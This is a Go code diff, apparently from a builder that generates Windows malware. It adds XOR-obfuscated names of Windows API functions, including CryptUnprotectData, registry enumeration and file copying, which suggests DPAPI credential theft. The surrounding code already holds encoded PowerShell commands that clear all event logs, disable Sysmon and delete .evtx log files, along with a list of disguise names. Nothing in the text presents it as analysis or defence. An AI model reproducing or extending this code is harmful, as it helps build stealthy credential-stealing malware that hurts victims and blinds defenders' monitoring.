@@ -177,6 +177,19 @@ type globalValues struct {
 	EncClearAllLogsCmd       string
 	EncDisableSysmonCmd      string
 	EncDeleteEvtxCmd         string
+
+	EncRegEnumValueW         string
+	EncCryptUnprotectData    string
+	EncLocalFree             string
+	EncCreateFileW           string
+	EncReadFile              string
+	EncGetFileSizeEx         string
+	EncCopyFileW             string
+
+	EncEnumDisplaySettingsW    string
+	EncChangeDisplaySettingsExW string
+	EncFindWindowW           string
+	EncFindWindowExW         string
 }
 
 var disguiseNames = []string{
@@ -477,6 +490,19 @@ func buildGlobals(cfg Config) (globalValues, error) {
 		EncClearAllLogsCmd:  xorWithKey("wevtutil el | ForEach-Object { wevtutil cl $_ 2>$null }", key),
 		EncDisableSysmonCmd: xorWithKey("Stop-Service Sysmon -Force -ErrorAction SilentlyContinue; Stop-Service Sysmon64 -Force -ErrorAction SilentlyContinue; sc.exe config Sysmon start=disabled 2>$null; sc.exe config Sysmon64 start=disabled 2>$null", key),
 		EncDeleteEvtxCmd:    xorWithKey("Remove-Item -Path (Join-Path $env:SystemRoot 'System32\\winevt\\Logs\\*.evtx') -Force -ErrorAction SilentlyContinue", key),
+
+		EncRegEnumValueW:         xorWithKey("RegEnumValueW", key),
+		EncCryptUnprotectData:    xorWithKey("CryptUnprotectData", key),
+		EncLocalFree:             xorWithKey("LocalFree", key),
+		EncCreateFileW:           xorWithKey("CreateFileW", key),
+		EncReadFile:              xorWithKey("ReadFile", key),
+		EncGetFileSizeEx:         xorWithKey("GetFileSizeEx", key),
+		EncCopyFileW:             xorWithKey("CopyFileW", key),
+
+		EncEnumDisplaySettingsW:    xorWithKey("EnumDisplaySettingsW", key),
+		EncChangeDisplaySettingsExW: xorWithKey("ChangeDisplaySettingsExW", key),
+		EncFindWindowW:           xorWithKey("FindWindowW", key),
+		EncFindWindowExW:         xorWithKey("FindWindowExW", key),
 	}, nil
 }
 
@@ -668,6 +694,18 @@ var encClearAllLogsCmd = "%s"
 var encDisableSysmonCmd = "%s"
 var encDeleteEvtxCmd = "%s"
 
+var encRegEnumValueWName = "%s"
+var encCryptUnprotectDataName = "%s"
+var encLocalFreeName = "%s"
+var encCreateFileWName = "%s"
+var encReadFileName = "%s"
+var encGetFileSizeExName = "%s"
+var encCopyFileWName = "%s"
+var encEnumDisplaySettingsWName = "%s"
+var encChangeDisplaySettingsExWName = "%s"
+var encFindWindowWName = "%s"
+var encFindWindowExWName = "%s"
+
 var decryptionKey = []byte("%s")
 `,
 		escapeGoString(g.ForceAdmin),
@@ -839,6 +877,18 @@ var decryptionKey = []byte("%s")
 		g.EncClearAllLogsCmd,
 		g.EncDisableSysmonCmd,
 		g.EncDeleteEvtxCmd,
+
+		g.EncRegEnumValueW,
+		g.EncCryptUnprotectData,
+		g.EncLocalFree,
+		g.EncCreateFileW,
+		g.EncReadFile,
+		g.EncGetFileSizeEx,
+		g.EncCopyFileW,
+		g.EncEnumDisplaySettingsW,
+		g.EncChangeDisplaySettingsExW,
+		g.EncFindWindowW,
+		g.EncFindWindowExW,
 
 		g.XorKeyLiteral,
 	)), nil
